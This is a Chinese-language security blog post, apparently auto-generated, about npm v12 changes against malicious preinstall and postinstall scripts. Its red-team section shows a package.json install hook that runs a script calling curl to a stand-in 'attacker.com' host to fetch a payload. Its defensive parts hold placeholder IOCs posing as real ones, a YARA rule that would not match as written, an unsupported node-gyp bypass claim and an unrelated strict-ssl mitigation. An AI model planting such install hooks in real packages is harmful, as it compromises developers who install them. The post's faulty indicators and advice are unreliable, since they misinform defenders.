---
layout: post
title:  "GitHub announces npm security changes to tackle supply-chain attacks"
date:   2026-06-10 20:18:36 +0000
categories: [security]
severity: high
---

# 🔥 解析 npm v12 安全性變更：防禦供應鏈攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.0)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `npm install`, `preinstall`, `postinstall`, `node-gyp`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: npm 的 `install` 命令會自動執行 `preinstall` 和 `postinstall` 腳本，這些腳本可能包含惡意代碼。另外，npm 也會自動下載和安裝依賴項，包括 Git 存儲庫和遠程 URL。
* **攻擊流程圖解**:
  1. 攻擊者創建一個惡意的 npm 包含有 `preinstall` 或 `postinstall` 腳本。
  2. 攻擊者將惡意包發佈到 npm 存儲庫。
  3. 受害者執行 `npm install` 命令，下載和安裝惡意包。
  4. 惡意包的 `preinstall` 或 `postinstall` 腳本被執行，導致遠程代碼執行。
* **受影響元件**: npm v11.x 和之前的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建一個惡意的 npm 包含有 `preinstall` 或 `postinstall` 腳本。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意包的 package.json
    {
      "name": "malicious-package",
      "version": "1.0.0",
      "scripts": {
        "preinstall": "node malicious-script.js"
      }
    }
    
    ```
```

javascript
// 惡意腳本
const childProcess = require('child_process');
childProcess.exec('curl http://attacker.com/malicious-payload');

```
* **繞過技術**: 攻擊者可以使用 `node-gyp` 來繞過 npm 的安全性檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | attacker.com | /usr/local/lib/node_modules/malicious-package |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_package {
      meta:
        description = "Detects malicious npm package"
      strings:
        $script = "node malicious-script.js"
      condition:
        $script at 0
    }
    
    ```
* **緩解措施**: 更新到 npm v12 或以上版本，並設定 `npm config set strict-ssl true` 來啟用 SSL 憑證驗證。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: 一個 Node.js 的包管理器，允許開發者輕鬆地安裝和管理依賴項。
* **preinstall** 和 **postinstall**: npm 的兩個生命週期事件，分別在安裝包之前和之後執行。
* **node-gyp**: 一個 Node.js 的原生模組編譯工具，允許開發者編譯和使用 C++ 代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/github-announces-npm-security-changes-to-tackle-supply-chain-attacks/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


